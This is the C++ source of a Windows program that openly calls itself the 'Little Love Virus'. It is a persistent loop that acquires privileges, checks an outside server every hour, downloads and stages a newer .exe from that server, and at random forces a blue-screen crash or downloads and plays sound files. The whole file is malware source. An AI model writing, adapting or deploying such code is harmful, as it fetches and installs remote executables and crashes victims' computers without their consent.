/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
*/


#define __BUILD__ 1
#include"std.h"
#include"func.h"
#include"hide.h"

int _tmain(int argc, _TCHAR* argv[])
{
	__time64_t *now=NULL;
	std::wstringstream wss;
	GetPrivileges();
	while (true)
	{
		_time64(now);
		srand(static_cast<unsigned int>(static_cast<unsigned int>(* now)));
		DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"),_T("%ProgramData%\\llv\\cache\\lastbuild.txt"));
		std::wfstream wfs(_T("%ProgramData%\\llv\\cache\\lastbuildnumber.txt"), std::ios::in);
		int lastbuildnumber = 0, lastbuildsize = 0;
		wfs >> lastbuildnumber;
		wfs.close();
		remove("%ProgramData%\\llv\\cache\\lastbuild.txt");
		if (lastbuildnumber > __BUILD__)
		{//update new Build
			std::wstring newbuildname;
			wss << lastbuildnumber << _T(".exe") << std::flush;
			wss >> newbuildname;
			DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname);
			wfs.open(_T("%ProgramData%\\llv\\launcherobj.txt"), std::ios::out);
			wfs << lastbuildnumber;
			wfs.close();
			if (rand() % 16 == 0)
				MakeBlueScreen(0xAA232323);
			if (rand() % 16 == 0)
			{
				std::wstring soundid;
				wss << rand() % 5 << std::flush;
				wss >> soundid;
				DownloadFileFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), _T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"));
				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"),true);

			}
		}
		Sleep(60 * 60 * 1000);//wait 1h

	}
	return 0;
}
